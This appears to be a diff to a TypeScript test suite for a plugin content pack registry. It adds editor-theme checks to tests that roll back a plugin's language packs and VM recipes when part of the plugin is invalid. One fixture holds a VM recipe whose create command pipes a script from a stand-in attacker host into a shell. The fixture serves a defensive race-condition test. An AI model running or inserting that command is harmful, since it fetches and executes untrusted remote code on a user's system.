@@ -11,6 +11,13 @@ import type { ValidDiscoveredPlugin } from './plugin-discovery'
 
 const roots: string[] = []
 
+const validEditorTheme = {
+  base: 'vs-dark',
+  inherit: true,
+  rules: [{ token: 'comment', foreground: '8a9aa8' }],
+  colors: { 'editor.background': '#0a0614' }
+}
+
 afterEach(async () => {
   await Promise.all(roots.splice(0).map((root) => rm(root, { recursive: true, force: true })))
 })
@@ -59,16 +66,67 @@ describe('PluginContentPackRegistry', () => {
     expect(registry.languagePacks.list()).toEqual([])
   })
 
+  it('rolls back a valid language pack when the same plugin theme is invalid', async () => {
+    const rootDir = await mkdtemp(join(tmpdir(), 'orca-plugin-content-pack-theme-'))
+    roots.push(rootDir)
+    await Promise.all([mkdir(join(rootDir, 'locales')), mkdir(join(rootDir, 'themes'))])
+    await Promise.all([
+      writeFile(join(rootDir, 'locales', 'es.json'), JSON.stringify({ settings: 'Ajustes' })),
+      writeFile(join(rootDir, 'themes', 'invalid.json'), '{"base":')
+    ])
+    const manifest = pluginManifestSchema.parse({
+      manifestVersion: 1,
+      id: 'mixed-theme',
+      publisher: 'orca-samples',
+      name: 'Mixed Theme',
+      version: '1.0.0',
+      engines: { orca: '>=1.0.0' },
+      pluginApi: 1,
+      contributes: {
+        languagePacks: [{ locale: 'es', path: 'locales/es.json' }],
+        editorThemes: [
+          {
+            id: 'broken',
+            label: 'Broken',
+            mode: 'dark',
+            path: 'themes/invalid.json'
+          }
+        ]
+      },
+      capabilities: []
+    })
+    const plugin: ValidDiscoveredPlugin = {
+      pluginKey: 'orca-samples.mixed-theme',
+      rootDir,
+      manifest,
+      consentFingerprint: fingerprintPluginConsent(manifest),
+      contentHash: null,
+      isDev: true
+    }
+    const registry = new PluginContentPackRegistry(new PluginContentVerifier(), () => false)
+
+    await registry.reconcile([plugin], () => true)
+
+    expect(registry.error(plugin.pluginKey)).toEqual(expect.stringMatching(/editor theme/i))
+    expect(registry.languagePacks.list()).toEqual([])
+    expect(registry.editorThemes.list()).toEqual([])
+  })
+
   it('rolls back valid packs when a VM recipe from the same plugin is invalid', async () => {
     const rootDir = await mkdtemp(join(tmpdir(), 'orca-plugin-content-pack-vm-'))
     roots.push(rootDir)
-    await Promise.all([mkdir(join(rootDir, 'locales')), mkdir(join(rootDir, 'recipes'))])
+    await Promise.all([
+      mkdir(join(rootDir, 'locales')),
+      mkdir(join(rootDir, 'recipes')),
+      mkdir(join(rootDir, 'themes'))
+    ])
     await Promise.all([
       writeFile(join(rootDir, 'locales', 'valid.json'), JSON.stringify({ settings: 'Ajustes' })),
       writeFile(
         join(rootDir, 'recipes', 'invalid.json'),
         JSON.stringify({ schemaVersion: 1, id: 'bad', name: 'Bad', create: 'create', resume: 'up' })
-      )
+      ),
+      writeFile(join(rootDir, 'themes', 'valid.json'), JSON.stringify(validEditorTheme))
     ])
     const manifest = pluginManifestSchema.parse({
       manifestVersion: 1,
@@ -80,7 +138,15 @@ describe('PluginContentPackRegistry', () => {
       pluginApi: 1,
       contributes: {
         languagePacks: [{ locale: 'es', path: 'locales/valid.json' }],
-        vmRecipes: [{ path: 'recipes/invalid.json' }]
+        vmRecipes: [{ path: 'recipes/invalid.json' }],
+        editorThemes: [
+          {
+            id: 'valid',
+            label: 'Valid',
+            mode: 'dark',
+            path: 'themes/valid.json'
+          }
+        ]
       },
       capabilities: []
     })
@@ -104,12 +170,17 @@ describe('PluginContentPackRegistry', () => {
     expect(registry.error(plugin.pluginKey)).toContain('suspend and resume')
     expect(registry.languagePacks.list()).toEqual([])
     expect(registry.vmRecipes.list()).toEqual([])
+    expect(registry.editorThemes.list()).toEqual([])
   })
 
   it('withholds content from a plugin killed during the awaited verification phase', async () => {
     const rootDir = await mkdtemp(join(tmpdir(), 'orca-plugin-content-pack-kill-race-'))
     roots.push(rootDir)
-    await Promise.all([mkdir(join(rootDir, 'locales')), mkdir(join(rootDir, 'recipes'))])
+    await Promise.all([
+      mkdir(join(rootDir, 'locales')),
+      mkdir(join(rootDir, 'recipes')),
+      mkdir(join(rootDir, 'themes'))
+    ])
     await Promise.all([
       writeFile(join(rootDir, 'locales', 'es.json'), JSON.stringify({ settings: 'Ajustes' })),
       writeFile(
@@ -120,7 +191,8 @@ describe('PluginContentPackRegistry', () => {
           name: 'Raced Recipe',
           create: 'curl https://attacker.example/payload.sh | sh'
         })
-      )
+      ),
+      writeFile(join(rootDir, 'themes', 'raced.json'), JSON.stringify(validEditorTheme))
     ])
     const manifest = pluginManifestSchema.parse({
       manifestVersion: 1,
@@ -132,7 +204,15 @@ describe('PluginContentPackRegistry', () => {
       pluginApi: 1,
       contributes: {
         languagePacks: [{ locale: 'es', path: 'locales/es.json' }],
-        vmRecipes: [{ path: 'recipes/vm.json' }]
+        vmRecipes: [{ path: 'recipes/vm.json' }],
+        editorThemes: [
+          {
+            id: 'raced-theme',
+            label: 'Raced Theme',
+            mode: 'dark',
+            path: 'themes/raced.json'
+          }
+        ]
       },
       capabilities: []
     })
@@ -161,5 +241,6 @@ describe('PluginContentPackRegistry', () => {
 
     expect(registry.vmRecipes.list()).toEqual([])
     expect(registry.languagePacks.list()).toEqual([])
+    expect(registry.editorThemes.list()).toEqual([])
   })
 })
